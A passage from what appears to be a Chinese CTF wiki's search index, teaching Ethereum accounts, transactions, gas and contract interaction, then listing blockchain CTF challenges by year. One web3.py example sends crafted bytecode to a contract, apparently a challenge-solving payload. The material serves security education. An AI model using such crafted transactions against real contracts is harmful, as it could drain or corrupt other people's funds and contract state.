\u6ca1\u6709\u76f8\u5173\u8054\u7684\u4ee3\u7801","title":"\u5916\u90e8\u8d26\u6237"},{"location":"blockchain/ethereum/basics/#_3","text":"\u5408\u7ea6\u8d26\u6237\u662f\u7531\u5916\u90e8\u8d26\u6237\u521b\u5efa\u7684\u8d26\u6237\uff0c\u5305\u542b\u5408\u7ea6\u4ee3\u7801\u3002\u5408\u7ea6\u8d26\u6237\u7684\u5730\u5740\u662f\u7531\u5408\u7ea6\u521b\u5efa\u65f6\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\uff0c\u4ee5\u53ca\u8be5\u5730\u5740\u53d1\u51fa\u7684\u4ea4\u6613\u5171\u540c\u8ba1\u7b97\u5f97\u51fa\u7684\u3002 \u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u5177\u6709\u4ee5\u4e0b\u7279\u6027 \u62e5\u6709\u4e00\u5b9a\u7684 Ether \u6709\u76f8\u5173\u8054\u7684\u4ee3\u7801\uff0c\u4ee3\u7801\u901a\u8fc7\u4ea4\u6613\u6216\u8005\u5176\u4ed6\u5408\u7ea6\u53d1\u9001\u7684\u8c03\u7528\u6765\u6fc0\u6d3b \u5f53\u5408\u7ea6\u88ab\u6267\u884c\u65f6\uff0c\u53ea\u80fd\u64cd\u4f5c\u5408\u7ea6\u8d26\u6237\u62e5\u6709\u7684\u7279\u5b9a\u5b58\u50a8 Note \u79c1\u94a5\u7ecf\u8fc7\u4e00\u79cd\u54c8\u5e0c\u7b97\u6cd5(\u692d\u5706\u66f2\u7ebf\u7b97\u6cd5 ECDSA-secp256k1 )\u8ba1\u7b97\u751f\u6210\u516c\u94a5\uff0c\u8ba1\u7b97\u516c\u94a5\u7684 Keccak-256 \u54c8\u5e0c\u503c\uff0c\u7136\u540e\u53d6\u6700\u540e 160 \u4f4d\u4e8c\u8fdb\u5236\uff08\u901a\u5e38\u8868\u73b0\u4e3a 40 \u4f4d\u7684 16 \u8fdb\u5236\u5b57\u7b26\u4e32\uff09\u5f62\u6210\u4e86\u5730\u5740\u3002\u5176\u4e2d\uff0c\u516c\u94a5\u548c\u5730\u5740\u90fd\u662f\u53ef\u4ee5\u516c\u5e03\u7684\uff0c\u800c\u79c1\u94a5\uff0c\u4f60\u53ea\u80fd\u81ea\u5df1\u6084\u6084\u7684\u85cf\u8d77\u6765\uff0c\u4e0d\u8981\u4e22\u5931\uff0c\u56e0\u4e3a\u4f60\u7684\u8d26\u6237\u4e2d\u7684\u8d44\u4ea7\u4e5f\u4f1a\u8ddf\u7740\u4e22\u6389\uff1b\u4e0d\u8981\u88ab\u522b\u4eba\u76d7\u53d6\uff0c\u56e0\u4e3a\u8d26\u6237\u4e2d\u7684\u8d44\u4ea7\u4e5f\u4f1a\u968f\u7740\u88ab\u76d7\u53d6\u3002\u6240\u4ee5\uff0c\u79c1\u94a5\u7684\u4fdd\u5b58\u975e\u5e38\u91cd\u8981\u3002 \u4ee5\u592a\u574a\u4e2d\uff0c\u8fd9\u4e24\u79cd\u8d26\u6237\u7edf\u79f0\u4e3a\u201c\u72b6\u6001\u5bf9\u8c61\u201d\uff08\u5b58\u50a8\u72b6\u6001\uff09\u3002\u5176\u4e2d\u5916\u90e8\u8d26\u6237\u5b58\u50a8\u4ee5\u592a\u5e01\u4f59\u989d\u72b6\u6001\uff0c\u800c\u5408\u7ea6\u8d26\u6237\u9664\u4e86\u4f59\u989d\u8fd8\u6709\u667a\u80fd\u5408\u7ea6\u53ca\u5176\u53d8\u91cf\u7684\u72b6\u6001\u3002\u901a\u8fc7\u4ea4\u6613\u7684\u6267\u884c\uff0c\u8fd9\u4e9b\u72b6\u6001\u5bf9\u8c61\u53d1\u751f\u53d8\u5316\uff0c\u800c Merkle \u6811\u7528\u4e8e\u7d22\u5f15\u548c\u9a8c\u8bc1\u72b6\u6001\u5bf9\u8c61\u7684\u66f4\u65b0\u3002\u4e00\u4e2a\u4ee5\u592a\u574a\u7684\u8d26\u6237\u5305\u542b 4 \u4e2a\u90e8\u5206\uff1a nonce: \u5df2\u6267\u884c\u4ea4\u6613\u603b\u6570\uff0c\u7528\u6765\u6807\u793a\u8be5\u8d26\u6237\u53d1\u51fa\u7684\u4ea4\u6613\u6570\u91cf\u3002 balance: \u8d26\u6301\u5e01\u6570\u91cf\uff0c\u8bb0\u5f55\u8d26\u6237\u7684\u4ee5\u592a\u5e01\u4f59\u989d\u3002 storageRoot: \u5b58\u50a8\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u667a\u80fd\u5408\u7ea6\u8d26\u6237\u7684\u5b58\u50a8\u6570\u636e\u533a\u3002 codeHash: \u4ee3\u7801\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u667a\u80fd\u5408\u7ea6\u8d26\u6237\u5b58\u50a8\u7684\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u3002 \u4e24\u4e2a\u5916\u90e8\u8d26\u6237\u4e4b\u95f4\u7684\u4ea4\u6613\u53ea\u662f\u4e00\u4e2a\u4ef7\u503c\u8f6c\u79fb\u3002\u4f46\u662f\u4ece\u5916\u90e8\u8d26\u6237\u5230\u5408\u7ea6\u8d26\u6237\u7684\u4ea4\u6613\u4f1a\u6fc0\u6d3b\u5408\u7ea6\u8d26\u6237\u7684\u4ee3\u7801\uff0c\u5141\u8bb8\u5b83\u6267\u884c\u5404\u79cd\u64cd\u4f5c\uff08\u4f8b\u5982\u8f6c\u79fb Token\uff0c\u5199\u5165\u5185\u90e8\u5b58\u50a8\uff0c\u521b\u5efa\u65b0\u7684 Token \uff0c\u6267\u884c\u4e00\u4e9b\u8ba1\u7b97\uff0c\u521b\u5efa\u65b0\u7684\u5408\u7ea6\u7b49\uff09\u3002 \u4e0e\u5916\u90e8\u8d26\u6237\u4e0d\u540c\uff0c\u5408\u7ea6\u8d26\u6237\u4e0d\u80fd\u81ea\u884c\u53d1\u8d77\u65b0\u7684\u4ea4\u6613\u3002\u76f8\u53cd\uff0c\u5408\u7ea6\u5e10\u6237\u53ea\u80fd\u89e6\u53d1\u4ea4\u6613\u4ee5\u54cd\u5e94\u5176\u4ed6\u4ea4\u6613\uff08\u4ece\u5916\u90e8\u62e5\u6709\u7684\u5e10\u6237\u6216\u5176\u4ed6\u5408\u7ea6\u5e10\u6237\uff09\u3002 Note \u6ce8\uff1a\u5408\u7ea6\u8d26\u6237\u548c\u5916\u90e8\u8d26\u6237\u6700\u5927\u7684\u4e0d\u540c\u5c31\u662f\u5b83\u8fd8\u5b58\u6709\u667a\u80fd\u5408\u7ea6\u3002","title":"\u5408\u7ea6\u8d26\u6237"},{"location":"blockchain/ethereum/basics/#_4","text":"\u4ee5\u592a\u574a\u7684\u4ea4\u6613\u4e3b\u8981\u662f\u6307\u4e00\u6761\u5916\u90e8\u8d26\u6237\u53d1\u9001\u5230\u533a\u5757\u94fe\u4e0a\u53e6\u4e00\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u5176\u4e3b\u8981\u5305\u542b\u53d1\u9001\u8005\u7684\u7b7e\u540d\u3001\u63a5\u6536\u8005\u7684\u5730\u5740\u4ee5\u53ca\u53d1\u9001\u8005\u8f6c\u79fb\u7ed9\u63a5\u6536\u8005\u7684\u4ee5\u592a\u5e01\u6570\u91cf\u7b49\u5185\u5bb9\u3002\u4ee5\u592a\u574a\u4e0a\u7684\u6bcf\u4e00\u7b14\u4ea4\u6613\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u8d39\u7528\uff0c\u7528\u4e8e\u652f\u4ed8\u4ea4\u6613\u6267\u884c\u6240\u9700\u8981\u7684\u8ba1\u7b97\u5f00\u9500\u3002\u8ba1\u7b97\u5f00\u9500\u7684\u8d39\u7528\u5e76\u4e0d\u662f\u4ee5\u592a\u5e01\u76f4\u63a5\u8ba1\u7b97\u7684\uff0c\u800c\u662f\u5f15\u5165 Gas \u4f5c\u4e3a\u6267\u884c\u5f00\u9500\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u901a\u8fc7 GasPrice \u4e0e\u4ee5\u592a\u5e01\u8fdb\u884c\u6362\u7b97\u7684\u3002 GasPrice \u6839\u636e\u5e02\u573a\u6ce2\u52a8\u8c03\u6574\uff0c\u907f\u514d\u4ee5\u592a\u5e01\u4ef7\u503c\u53d7\u5e02\u573a\u4ef7\u683c\u7684\u5f71\u54cd\u3002\u4ea4\u6613\u662f\u4ee5\u592a\u574a\u6574\u4f53\u7ed3\u6784\u4e2d\u7684\u91cd\u8981\u90e8\u5206\uff0c\u5b83\u5c06\u4ee5\u592a\u574a\u7684\u8d26\u6237\u8fde\u63a5\u8d77\u6765\uff0c\u8d77\u5230\u4ef7\u503c\u7684\u4f20\u9012\u4f5c\u7528\u3002","title":"\u4ea4\u6613"},{"location":"blockchain/ethereum/basics/#_5","text":"Gas: \u8861\u91cf\u4e00\u7b14\u4ea4\u6613\u6240\u6d88\u8017\u7684\u8ba1\u7b97\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d Gas Price: \u4e00\u5355\u4f4d Gas \u6240\u9700\u7684\u624b\u7eed\u8d39\uff08Ether\uff09 Gas Limit: \u4ea4\u6613\u53d1\u9001\u8005\u613f\u610f\u4e3a\u8fd9\u7b14\u4ea4\u6613\u6267\u884c\u6240\u652f\u4ed8\u7684\u6700\u5927 Gas \u6570\u91cf Note \u6ce8\uff1a\u5982\u679c\u4ea4\u6613\u5b9e\u9645\u6d88\u8017\u7684 Gas (Gas Used) \u5c0f\u4e8e Gas Limit, \u90a3\u4e48\u6267\u884c\u7684\u77ff\u5de5\u53ea\u4f1a\u6536\u53d6\u5b9e\u9645\u8ba1\u7b97\u5f00\u9500\uff08Gas Used\uff09\u5bf9\u5e94\u7684\u4ea4\u6613\u624b\u7eed\u8d39\uff08Gas Used * Gas Price\uff09\uff1b\u800c\u5982\u679c Gas Used \u5927\u4e8e Gas Limit\uff0c\u90a3\u4e48\u77ff\u5de5\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u53d1\u73b0 Gas \u5df2\u88ab\u8017\u5c3d\u800c\u4ea4\u6613\u6ca1\u6709\u6267\u884c\u5b8c\u6210\uff0c\u6b64\u65f6\u77ff\u5de5\u4f1a\u56de\u6eda\u5230\u7a0b\u5e8f\u6267\u884c\u524d\u5230\u72b6\u6001\uff0c\u800c\u4e14\u6536\u53d6 Gas Limit \u6240\u5bf9\u5e94\u7684\u624b\u7eed\u8d39\uff08GasPrice * Gas Limit\uff09\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c GasPrice * Gas Limit \u8868\u793a\u7528\u6237\u613f\u610f\u4e3a\u4e00\u7b14\u4ea4\u6613\u652f\u4ed8\u7684\u6700\u9ad8\u91d1\u989d\u3002","title":"\u4ea4\u6613\u8d39\u7528"},{"location":"blockchain/ethereum/basics/#_6","text":"\u4ee5\u592a\u574a\u4e2d\u7684\u4ea4\u6613\uff08Transaction\uff09\u662f\u6307\u5b58\u50a8\u4e00\u6761\u4ece\u5916\u90e8\u8d26\u6237\u53d1\u9001\u5230\u533a\u5757\u94fe\u4e0a\u53e6\u4e00\u4e2a\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u5b83\u65e2\u53ef\u4ee5\u662f\u7b80\u5355\u7684\u8f6c\u8d26\uff0c\u4e5f\u53ef\u4ee5\u662f\u5305\u542b\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u7684\u6d88\u606f\u3002\u4e00\u6761\u4ea4\u6613\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a from: \u4ea4\u6613\u53d1\u9001\u8005\u7684\u5730\u5740\uff0c\u5fc5\u586b\uff1b to: \u4ea4\u6613\u63a5\u6536\u8005\u7684\u5730\u5740\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u610f\u5473\u8fd9\u662f\u4e00\u4e2a\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u7684\u4ea4\u6613\uff1b value: \u53d1\u9001\u8005\u8981\u8f6c\u79fb\u7ed9\u63a5\u6536\u8005\u7684\u4ee5\u592a\u5e01\u6570\u91cf data: \u5b58\u5728\u7684\u6570\u636e\u5b57\u6bb5\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u8868\u660e\u8be5\u4ea4\u6613\u662f\u4e00\u4e2a\u521b\u5efa\u6216\u8005\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u7684\u4ea4\u6613\uff1b Gas Limit: \u8868\u793a\u4ea4\u6613\u5141\u8bb8\u6d88\u8017\u7684\u6700\u5927 Gas \u6570\u91cf\uff1b GasPrice: \u53d1\u9001\u8005\u613f\u610f\u652f\u4ed8\u7ed9\u77ff\u5de5\u7684 Gas \u5355\u4ef7\uff1b nonce: \u7528\u6765\u533a\u522b\u540c\u4e00\u8d26\u6237\u53d1\u51fa\u7684\u4e0d\u540c\u4ea4\u6613\u7684\u6807\u8bb0\uff1b hash: \u7531\u4ee5\u4e0a\u4fe1\u606f\u751f\u6210\u7684\u6563\u5217\u503c\uff08\u54c8\u5e0c\u503c\uff09\uff1b r\u3001s\u3001v: \u4ea4\u6613\u7b7e\u540d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7531\u53d1\u9001\u8005\u7684\u79c1\u94a5\u5bf9\u4ea4\u6613 hash \u8fdb\u884c\u7b7e\u540d\u751f\u6210\u3002 \u4ee5\u4e0a\u662f\u4ee5\u592a\u574a\u4e2d\u4ea4\u6613\u53ef\u80fd\u5305\u542b\u7684\u5185\u5bb9\uff0c\u5728\u4e0d\u540c\u573a\u666f\u4e0b\uff0c\u4ea4\u6613\u6709\u4e09\u79cd\u7c7b\u578b\u3002 \u8f6c\u5e10\u4ea4\u6613 \u8f6c\u8d26\u662f\u6700\u7b80\u5355\u7684\u4e00\u79cd\u4ea4\u6613\uff0c\u4ece\u4e00\u4e2a\u8d26\u6237\u5411\u53e6\u4e00\u4e2a\u8d26\u6237\u53d1\u9001 Ether\uff0c\u53d1\u9001\u8f6c\u8d26\u4ea4\u6613\u65f6\u53ea\u9700\u8981\u6307\u5b9a\u4ea4\u6613\u7684\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8f6c\u79fb\u7684 Ether \u6570\u91cf\u5373\u53ef\uff08\u5728\u5ba2\u6237\u7aef\u53d1\u9001\u4ea4\u6613\u65f6\uff0cGas Limit\u3001Gas Price\u3001nonce\u3001hash\u3001\u7b7e\u540d\u53ef\u4ee5\u6309\u7167\u9ed8\u8ba4\u65b9\u5f0f\u751f\u6210\uff09\uff0c\u5982\u4e0b\u6240\u793a web3.eth.sendTransaction({ from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\", to: \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\", value: 1000 }) \u521b\u5efa\u5408\u7ea6\u7684\u4ea4\u6613 \u521b\u5efa\u5408\u7ea6\u662f\u6307\u5c06\u5408\u7ea6\u90e8\u7f72\u5230\u533a\u5757\u94fe\u4e0a\uff0c\u8fd9\u4e5f\u662f\u901a\u8fc7\u4ea4\u6613\u6765\u5b8c\u6210\u7684\u3002\u521b\u5efa\u5408\u7ea6\u65f6\uff0cto \u5b57\u6bb5\u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\uff0cdata \u5b57\u6bb5\u662f\u5408\u7ea6\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u5728\u4e4b\u540e\u5408\u7ea6\u88ab\u8c03\u7528\u65f6\uff0c\u8be5\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u5c06\u4f5c\u4e3a\u5408\u7ea6\u4ee3\u7801\uff0c\u5982\u4e0b\u6240\u793a web3.eth.sendTransaction({ from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\", data: \"contract binary code\" }) \u6267\u884c\u5408\u7ea6\u7684\u4ea4\u6613 \u8be5\u4ea4\u6613\u4e2d\uff0cto \u5b57\u6bb5\u662f\u8981\u8c03\u7528\u7684\u667a\u80fd\u5408\u7ea6\u7684\u5730\u5740\uff0c\u901a\u8fc7 data \u5b57\u6bb5\u6307\u5b9a\u8981\u8c03\u7528\u7684\u65b9\u6cd5\u4ee5\u53ca\u5411\u8be5\u65b9\u6cd5\u4f20\u5165\u53c2\u6570\uff0c\u5982\u4e0b\u6240\u793a web3.eth.sendTransaction({ from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\", to: \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\", data: \"hash of the invoked method signature and encoded parameters\" }) Info \u6839\u636e to\u3001data \u5b57\u6bb5\u5185\u5bb9\u4e5f\u53ef\u4ee5\u53cd\u8fc7\u6765\u5224\u65ad\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u4ea4\u6613\uff0c\u7136\u540e\u53ef\u4ee5\u7ee7\u7eed\u5206\u6790\u3002","title":"\u4ea4\u6613\u5185\u5bb9"},{"location":"blockchain/ethereum/basics/#interact-with-contracts","text":"\u76f4\u63a5\u901a\u8fc7 Remix \u4ea4\u4e92 Remix \u4e0d\u80fd\u591f\u505a\u5230\u81ea\u52a8\u5316\uff0c\u6240\u4ee5\u4fbf\u6709\u5f00\u53d1\u4eba\u5458\u505a\u4e86\u4e00\u4e9b\u5de5\u4f5c Python \u7684 web3.py \u5e93 Nodejs \u7684 web3.js \u5e93 Infura \u63d0\u4f9b\u4e86 RPC API \u4f9b\u5f00\u53d1\u8005\u8c03\u7528\uff0c\u73b0\u652f\u6301 Ethereum\u3001Eth2\u3001Filecoin \u4f7f\u7528 Infura \u63d0\u4f9b\u7684 RPC API\uff0c\u5229\u7528 web3.py \u6216\u8005 web3.js \u5e93\u4e0e\u5176\u8fdb\u884c\u81ea\u52a8\u5316\u4ea4\u4e92 Infura \u73b0\u652f\u6301\u5982\u4e0b\u7f51\u7edc\u7684\u8bbf\u95ee\u70b9\uff1a \u7f51\u7edc \u8bf4\u660e URL Mainnet JSON-RPC over HTTPs https://mainnet.infura.io/v3/YOUR-PROJECT-ID Mainnet JSON-RPC over websockets wss://mainnet.infura.io/ws/v3/YOUR-PROJECT-ID Ropsten JSON-RPC over HTTPs https://ropsten.infura.io/v3/YOUR-PROJECT-ID Ropsten JSON-RPC over websockets wss://ropsten.infura.io/ws/v3/YOUR-PROJECT-ID Rinkeby JSON-RPC over HTTPs https://rinkeby.infura.io/v3/YOUR-PROJECT-ID Rinkeby JSON-RPC over websockets wss://rinkeby.infura.io/ws/v3/YOUR-PROJECT-ID Kovan JSON-RPC over HTTPs https://kovan.infura.io/v3/YOUR-PROJECT-ID Kovan JSON-RPC over websockets wss://kovan.infura.io/ws/v3/YOUR-PROJECT-ID G\u00f6rli JSON-RPC over HTTPs https://goerli.infura.io/v3/YOUR-PROJECT-ID G\u00f6rli JSON-RPC over websockets wss://goerli.infura.io/ws/v3/YOUR-PROJECT-ID Mainnet(eth2) JSON-RPC over HTTPs https://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@eth2-beacon-mainnet.infura.io pyrmont(eth2) JSON-RPC over websockets wss://YOUR-PROJECT-ID: YOUR-PROJECT-SECRET@eth2-beacon-mainnet.infura.io Filecoin JSON-RPC over HTTPs https://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@filecoin.infura.io Filecoin JSON-RPC over websockets wss://YOUR-PROJECT-ID: YOUR-PROJECT-SECRET@filecoin.infura.io Note \u6ce8\uff1a\u4f7f\u7528\u65f6\uff0c\u8bf7\u52a1\u5fc5\u4f7f\u7528\u4f60\u7684Infura\u4eea\u8868\u76d8 \u4e2d\u7684\u9879\u76ee ID/Project ID \u6216 Project Secret \u6765\u66ff\u6362\u4ee5\u4e0a URL \u4e2d\u7684 YOUR-PROJECT-ID \u6216 YOUR-PROJECT-SECRET \u4e0b\u9762\u662f\u4f7f\u7528 web3.py \u548c Infura API \u4e0e\u667a\u80fd\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\u8c03\u7528\u5408\u7ea6\u51fd\u6570\u9009\u62e9\u5668\u4e3a 0x00774360 \u7684\u51fd\u6570\u7684\u4f8b\u5b50 from web3 import Web3 , HTTPProvider w3 = Web3 ( Web3 . HTTPProvider ( \"https://rinkeby.infura.io/v3/YOUR-PROJECT-ID\" )) contract_address = \"0x31c883a9aa588d3f890c26c7844062d99444b5d6\" private = \"your private key\" public = \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\" def deploy ( public ): txn = { 'from' : Web3 . toChecksumAddress ( public ), 'to' : Web3 . toChecksumAddress ( contract_address ), 'gasPrice' : w3 . eth . gasPrice , 'gas' : 3000000 , 'nonce' : w3 . eth . getTransactionCount ( Web3 . toChecksumAddress ( public )), 'value' : Web3 . toWei ( 0 , 'ether' ), 'data' : '0x007743600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a6100016100016100016100016100016100650361000161fbfbf1000000000000' , } signed_txn = w3 . eth . account . signTransaction ( txn , private ) txn_hash = w3 . eth . sendRawTransaction ( signed_txn . rawTransaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( \"txn_hash=\" , txn_hash ) return txn_receipt print ( deploy ( public ))","title":"Interact with Contracts"},{"location":"blockchain/ethereum/basics/#txorigin-vs-msgsender","text":"\u8fd9\u91cc\u533a\u5206\u4e00\u4e0b tx.origin \u548c msg.sender \uff0cmsg.sender \u662f\u51fd\u6570\u7684\u76f4\u63a5\u8c03\u7528\u65b9\uff0c\u5728\u7528\u6237\u624b\u52a8\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u662f\u53d1\u8d77\u4ea4\u6613\u7684\u8d26\u6237\u5730\u5740\uff0c\u4f46\u4e5f\u53ef\u4ee5\u662f\u8c03\u7528\u8be5\u51fd\u6570\u7684\u4e00\u4e2a\u667a\u80fd\u5408\u7ea6\u7684\u5730\u5740\u3002\u800c tx.origin \u5219\u5fc5\u7136\u662f\u8fd9\u4e2a\u4ea4\u6613\u7684\u539f\u59cb\u53d1\u8d77\u65b9\uff0c\u65e0\u8bba\u4e2d\u95f4\u6709\u591a\u5c11\u6b21\u5408\u7ea6\u5185/\u8de8\u5408\u7ea6\u51fd\u6570\u8c03\u7528\uff0c\u800c\u4e14\u4e00\u5b9a\u662f\u8d26\u6237\u5730\u5740\u800c\u4e0d\u662f\u5408\u7ea6\u5730\u5740\u3002 \u7ed9\u5b9a\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\u5982\uff1a\u7528\u6237\u901a\u8fc7\u5408\u7ea6 A \u8c03\u5408\u7ea6B\uff0c\u6b64\u65f6\uff1a \u5bf9\u4e8e\u5408\u7ea6 A : tx.origin \u548c msg.sender \u90fd\u662f\u7528\u6237 \u5bf9\u4e8e\u5408\u7ea6 B : tx.origin \u662f\u7528\u6237\uff0cmsg.sender \u662f\u5408\u7ea6 A","title":"tx.origin vs msg.sender"},{"location":"blockchain/ethereum/challenges/","text":"\u533a\u5757\u94fe\u6bd4\u8d5b\u9898\u76ee \u00b6 Note \u6ce8\uff1aCTF \u4e2d\u533a\u5757\u94fe\u7684\u9898\u76ee\u5e76\u4e0d\u662f\u5f88\u591a\uff0c\u6240\u4ee5\u641c\u96c6\u4e86\u7edd\u5927\u591a\u6570\u7684\u9898\u76ee\uff0c\u4ee5\u4e0b\u6309\u7167\u5e74\u4efd\u9644\u4e0a\u9898\u76ee\u94fe\u63a5\u53ca\u5176 WP \u94fe\u63a5\uff0c\u9898\u76ee\u5217\u8868\u4e0d\u5b8c\u6574\u4f1a\u968f\u65f6\u66f4\u65b0\uff0c\u540c\u4e00\u5e74\u4e2d\u6bd4\u8d5b\u540d\u79f0\u4e0d\u533a\u5206\u987a\u5e8f\uff0c\u5982\u679c\u6709\u591a\u7bc7 WP\uff0c\u4e5f\u4e0d\u533a\u5206\u987a\u5e8f\u3002\u76f8\u5173\u9898\u76ee\u53ef\u5230 ctf-challenges/blockchain \u4ed3\u5e93\u67e5\u627e\u3002 2021 \u00b6 RealWorld \u00b6 \u9898\u76ee\u540d\u79f0 Re: Montagy \u9898\u76ee\u540d\u79f0 EasyDefi \u9898\u76ee\u540d\u79f0 billboard \ud83c\udf1fctf \u00b6 \u9898\u76ee\u540d\u79f0 StArNDBOX 2020 \u00b6 \u9ad8\u6821\u6218\u201c\u75ab\u201d\u7f51\u7edc\u5b89\u5168\u5206\u4eab\u8d5b \u00b6 \u9898\u76ee\u540d\u79f0 OwnerMoney RCTF \u00b6 \u9898\u76ee\u540d\u79f0 roiscoin \u7b2c\u4e94\u7a7a\u95f4 \u00b6 \u9898\u76ee\u540d\u79f0 CreativityPlus \u9898\u76ee\u540d\u79f0 SafeDelegatecall \u7b2c\u4e00\u5c4a\u9493\u9c7c\u57ce\u676f \u00b6 \u9898\u76ee\u540d\u79f0 StrictMathematician QWB \u00b6 \u9898\u76ee\u540d\u79f0 IPFS \u9898\u76ee\u540d\u79f0 EasyAssembly \u9898\u76ee\u540d\u79f0 EasyFake \u9898\u76ee\u540d\u79f0 EasySandbox \u9898\u76ee\u540d\u79f0 EthGaMe (EGM) \u9898\u76ee\u540d\u79f0 EBK Balsn \u00b6 \u9898\u76ee\u540d\u79f0 Election \u9898\u76ee\u540d\u79f0 IdleGame \u534e\u4e3a\u4e91\u5b89\u5168 \u00b6 \u9898\u76ee\u540d\u79f0 ethenc \u534e\u4e3a\u9cb2\u9e4f\u8ba1\u7b97 \u00b6 \u9898\u76ee\u540d\u79f0 boxgame \u534e\u4e3a\u9e3f\u8499 \u00b6 \u9898\u76ee\u540d\u79f0 ContractGame 2019 \u00b6 RealWorld \u00b6 \u9898\u76ee\u540d\u79f0 Montagy balsn \u00b6 \u9898\u76ee\u540d\u79f0 Bank \u9898\u76ee\u540d\u79f0 Creativity CISCN \u00b6 \u9898\u76ee\u540d\u79f0 Daysbank QWB \u00b6 \u9898\u76ee\u540d\u79f0 babybank \u9898\u76ee\u540d\u79f0 babybet Byte \u00b6 \u9898\u76ee\u540d\u79f0 bet \u9898\u76ee\u540d\u79f0 hf N1CTF \u00b6 \u9898\u76ee\u540d\u79f0 h4ck \u6570\u5b57\u7ecf\u6d4e \u00b6 \u9898\u76ee\u540d\u79f0 cow \u9898\u76ee\u540d\u79f0 rise \u9898\u76ee\u540d\u79f0 jojo RoarCTF \u00b6 \u9898\u76ee\u540d\u79f0 CoinFlip Hackergame \u00b6 \u9898\u76ee\u540d\u79f0 JCBank XCTF_final \u00b6 \u9898\u76ee\u540d\u79f0 Happy_DOuble_Eleven D^3CTF \u00b6 \u9898\u76ee\u540d\u79f0 bet2loss_v2 De1CTF \u00b6 \u9898\u76ee\u540d\u79f0 Easy EOS 2018 \u00b6 RealWorld \u00b6 \u9898\u76ee\u540d\u79f0 Acoraida Monica HCTF \u00b6 \u9898\u76ee\u540d\u79f0 ethre \u9898\u76ee\u540d\u79f0 bet2loss \u9898\u76ee\u540d\u79f0 ez2win BCTF \u00b6 \u9898\u76ee\u540d\u79f0 Fake3d \u9898\u76ee\u540d\u79f0 EOSGAME WCTF \u00b6 \u9898\u76ee\u540d\u79f0 BelluminarBank LCTF \u00b6 \u9898\u76ee\u540d\u79f0 easy little trick \u9898\u76ee\u540d\u79f0 ggbank startctf \u00b6 \u9898\u76ee\u540d\u79f0 web-smart_contract DDCTF \u00b6 \u9898\u76ee\u540d\u79f0 mini blockchain 2017 \u00b6 dctf \u00b6 \u9898\u76ee\u540d\u79f0 spock-lizard-alpha \u9898\u76ee\u540d\u79f0 spock-lizard-beta \u9898\u76ee\u540d\u79f0 spock-lizard-omega","title":"\u533a\u5757\u94fe\u6bd4\u8d5b\u9898\u76ee"},{"location":"blockchain/ethereum/challenges/#_1","text":"Note \u6ce8\uff1aCTF \u4e2d\u533a\u5757\u94fe\u7684\u9898\u76ee\u5e76\u4e0d\u662f\u5f88\u591a\uff0c\u6240\u4ee5\u641c\u96c6\u4e86\u7edd\u5927\u591a\u6570\u7684\u9898\u76ee\uff0c\u4ee5\u4e0b\u6309\u7167\u5e74\u4efd\u9644\u4e0a\u9898\u76ee\u94fe\u63a5\u53ca\u5176 WP \u94fe\u63a5\uff0c\u9898\u76ee\u5217\u8868\u4e0d\u5b8c\u6574\u4f1a\u968f\u65f6\u66f4\u65b0\uff0c\u540c\u4e00\u5e74\u4e2d\u6bd4\u8d5b\u540d\u79f0\u4e0d\u533a\u5206\u987a\u5e8f\uff0c\u5982\u679c\u6709\u591a\u7bc7 WP\uff0c\u4e5f\u4e0d\u533a\u5206\u987a\u5e8f\u3002\u76f8\u5173\u9898\u76ee\u53ef\u5230 ctf-challenges/blockchain \u4ed3\u5e93\u67e5\u627e\u3002","title":"\u533a\u5757\u94fe\u6bd4\u8d5b\u9898\u76ee"},{"location":"blockchain/ethereum/challenges/#2021","text":"","title":"2021"},{"location":"blockchain/ethereum/challenges/#realworld","text":"\u9898\u76ee\u540d\u79f0 Re: Montagy \u9898\u76ee\u540d\u79f0 EasyDefi \u9898\u76ee\u540d\u79f0 billboard","title":"RealWorld"},{"location":"blockchain/ethereum/challenges/#ctf","text":"\u9898\u76ee\u540d\u79f0 StArNDBOX","title":"\ud83c\udf1fctf"},{"location":"blockchain/ethereum/challenges/#2020","text":"","title":"2020"},{"location":"blockchain/ethereum/challenges/#_2","text":"\u9898\u76ee\u540d\u79f0 OwnerMoney","title":"\u9ad8\u6821\u6218\u201c\u75ab\u201d\u7f51\u7edc\u5b89\u5168\u5206\u4eab\u8d5b"},{"location":"blockchain/ethereum/challenges/#rctf","text":"\u9898\u76ee\u540d\u79f0 